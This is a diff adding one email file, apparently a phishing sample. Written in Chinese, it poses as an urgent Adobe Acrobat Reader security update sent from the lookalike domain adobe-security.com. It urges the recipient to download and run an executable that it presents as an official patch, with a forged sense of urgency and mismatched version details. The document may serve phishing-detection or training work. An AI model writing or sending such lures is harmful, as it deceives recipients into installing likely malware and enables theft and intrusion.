@@ -1,0 +1,33 @@
+Received: from update.adobe-security.com ([192.150.187.44])
+	by mx.126.com (NetEase) with ESMTP id r0G3vR6u033287
+	for <designer_chen@126.com>; Sun, 08 Jun 2025 23:08:22 +0800 (CST)
+Message-ID: <202506082308.r0G3vR6u033287@mx.126.com>
+Received: from web-server.local (HELO localhost) (127.0.0.1)
+	by 192.150.187.44 with SMTP; Sun, 08 Jun 2025 23:08:21 +0800
+X-Originating-IP: [4.34.66.108]
+Date: Sun, 08 Jun 2025 23:08:20 +0800
+From: "Adobe" <security@adobe-security.com>
+To: <designer_chen@126.com>
+Subject: =?gb2312?B?sNKxy87EvP6jrNDQzsS1xLrq1tA=?=
+X-Mailer: 1234m 6.0
+Mime-Version: 1.0
+X-Priority: 1
+X-MSMail-Priority: High
+Content-Type: text/html; charset="gb2312"
+
+【Adobe产品重要安全更新】
+
+尊敬的Adobe用户：
+
+我们近期在 Adobe Acrobat Reader 中发现了一个严重的安全漏洞(APSB25-06)，允许攻击者远程执行代码。为了保护您的系统安全，我们强烈建议您立即更新到最新版本。
+
+您的当前版本：11.0.1
+最新安全版本：11.0.2
+
+请下载并运行下方的官方安全更新程序。
+
+下载更新程序：http://download.adobe-security.com/patches/Acrobat_DC_Upd_250608.exe
+
+安装过程大约需要1-2分钟，期间请关闭所有Adobe相关软件。感谢您的合作。
+
+Adobe产品安全响应团队
